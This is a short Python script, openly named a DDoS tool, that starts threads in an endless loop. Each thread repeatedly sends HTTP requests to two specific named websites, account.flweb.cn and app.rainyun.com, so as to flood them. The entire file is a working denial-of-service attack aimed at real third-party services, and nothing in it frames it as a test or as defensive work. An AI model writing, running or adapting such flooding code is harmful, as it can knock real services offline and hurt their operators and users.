import requests
from threading import Thread

def ddos():
    while True:
        print('start ddos')
        requests.get('https://account.flweb.cn')
        requests.get('https://app.rainyun.com')
        print('end ddos')

while True:
    t = Thread(target=ddos)
    t.start()